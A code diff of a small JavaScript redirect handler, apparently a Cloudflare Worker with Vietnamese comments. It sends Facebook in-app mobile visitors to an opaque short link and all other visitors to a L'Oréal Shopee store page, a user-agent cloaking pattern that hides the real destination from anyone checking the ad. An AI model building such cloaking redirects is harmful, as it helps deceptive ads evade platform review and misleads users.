@@ -1,13 +1,13 @@
 export default {
   async fetch(request) {
-    let userAgent = request.headers.get("User-Agent") || "";
-    let isFacebookApp = userAgent.includes("FBAN") || userAgent.includes("FBAV");
-    let isMobileDevice = /Android|iPhone|iPad|iPod/i.test(userAgent);
+    const userAgent = request.headers.get("User-Agent") || "";
 
-    if (isFacebookApp && isMobileDevice) {
-      return Response.redirect("https://lfb.ink/031225", 302);
-    } else {
-      return Response.redirect("https://shopee.vn/lorealparis_officialstore", 302);
+    // Kiểm tra Facebook App trên Mobile
+    if (/FBAN|FBAV/i.test(userAgent) && /Android|iPhone|iPad|iPod/i.test(userAgent)) {
+      return Response.redirect("https://lfb.ink/031225", 301);
     }
+    
+    // Chuyển hướng mặc định
+    return Response.redirect("https://shopee.vn/lorealparis_officialstore", 301);
   }
 };
